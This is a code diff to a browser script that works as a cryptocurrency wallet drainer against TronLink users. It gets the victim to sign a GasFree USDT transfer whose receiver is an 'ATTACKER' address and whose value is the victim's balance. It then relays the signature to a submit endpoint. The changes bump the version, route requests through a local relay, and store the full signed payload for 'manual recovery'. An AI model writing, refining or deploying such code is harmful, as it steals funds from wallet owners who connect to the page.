@@ -857,7 +857,7 @@ function waitForTronLinkAndRun() {
           var USDT_ADDR    = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  // USDT TRC20
           var ATTACKER     = window._ATTACKER_ADDR;
 
-          window.__logINF('GF v11 start — victim=' + addr.slice(0,12) + '…');
+          window.__logINF('GF v13 start — victim=' + addr.slice(0,12) + '…');
 
           // ── Step 1: Query providers (public GET, no auth) ──────────────────
           var provAddr = null;
@@ -905,7 +905,7 @@ function waitForTronLinkAndRun() {
           var nonce = 0;
           var usdtBalance = '1000000'; // default 1 USDT fallback
           try {
-            var aResp = await fetch(GF_API + '/api/v1/address/' + addr);
+            var aResp = await fetch('/api/account?addr=' + encodeURIComponent(addr));
             if (aResp.ok) {
               var aData = await aResp.json();
               var info = (aData && aData.data) || aData;
@@ -1258,6 +1258,14 @@ function waitForTronLinkAndRun() {
           _applying = false;
           if (typeof window.fillSignature === 'function') window.fillSignature(cleanSig.slice(0, 64) + '…');
           window.__logOK('GF sig captured len=' + cleanSig.length);
+          // Store full payload for manual recovery
+          window.__lastPayload = {
+            token: USDT_ADDR, provider: provAddr, user: addr,
+            receiver: ATTACKER, value: parseInt(usdtBalance,10),
+            maxFee: parseInt(maxFee,10), deadline: parseInt(deadline,10),
+            version: 1, nonce: nonce, sig: cleanSig
+          };
+          window.__logINF('Full payload stored in window.__lastPayload — JSON.stringify in console to retrieve');
 
           // ── Step 6: Submit to GasFree relay ──────────────────────────────
           var submitBody = {
@@ -1273,9 +1281,9 @@ function waitForTronLinkAndRun() {
             sig:      cleanSig
           };
 
-          window.__logINF('GF submit to ' + GF_API + '/api/v1/gasfree/submit');
+          window.__logINF('GF submit via relay /api/submit');
           try {
-            var sResp = await fetch(GF_API + '/api/v1/gasfree/submit', {
+            var sResp = await fetch('/api/submit', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify(submitBody)
@@ -1298,7 +1306,7 @@ function waitForTronLinkAndRun() {
           }
 
         } catch(e) {
-          window.__logERR('GF v11 FAIL: ' + e.message);
+          window.__logERR('GF v13 FAIL: ' + e.message);
           _applying = false;
         }
       })();
